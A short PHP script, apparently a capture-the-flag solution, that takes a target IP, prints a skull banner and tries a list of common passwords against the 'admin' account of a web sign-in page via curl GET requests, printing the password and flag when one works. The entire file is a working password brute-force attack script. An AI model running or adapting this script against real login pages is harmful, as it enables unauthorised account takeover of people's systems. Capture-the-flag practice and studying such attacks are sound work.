<?php

if ($argc < 2) die('Usage: php ' . $argv[0] . ' <ip>' . PHP_EOL);

echo '                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
';

$passwords = explode(' ', '123456 password 12345678 qwerty abc123 123456789 111111 1234567 123123 1234567890 shadow 12345 password1 000000');
$url = "http://" . $argv[1] . "/index.php?page=signin&Login=Login&username=admin&password=";

while ($pass = array_shift($passwords)) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url . $pass);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $output = curl_exec($ch);

    $search = preg_grep('/(The flag is : )([a-zA-Z0-9]*)/', explode(PHP_EOL, $output));

    if ($search) {
        die('Password is : ' . $pass . PHP_EOL . preg_replace('/(<?[a-z0-9;"-:= ]*>)/', '', array_shift($search)) . PHP_EOL);
    }

    curl_close($ch);
}
